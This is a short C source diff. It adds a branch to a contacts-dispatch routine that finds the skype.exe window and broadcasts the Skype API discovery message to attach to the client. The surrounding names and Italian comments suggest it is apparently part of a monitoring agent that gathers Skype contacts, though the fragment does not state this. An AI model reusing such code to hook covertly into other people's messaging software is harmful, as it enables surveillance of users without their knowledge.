@@ -181,7 +181,16 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 		if (skype_api_wnd && skype_pm_wnd)
 			SendRequestContacts(skype_api_wnd, skype_pm_wnd);
 		return 1;
+	} else if (dwFlags & FLAGS_SKAPI_ATT) {
+		// Deve mandare il messaggio per il discovery
+		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
+		HWND skype_wnd = HM_GetProcessWindow("skype.exe");
+		if (skype_wnd == NULL || msg_type == 0)
+			return TRUE;
+		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)skype_wnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
+		return TRUE;
 	}
+
 }
 
 
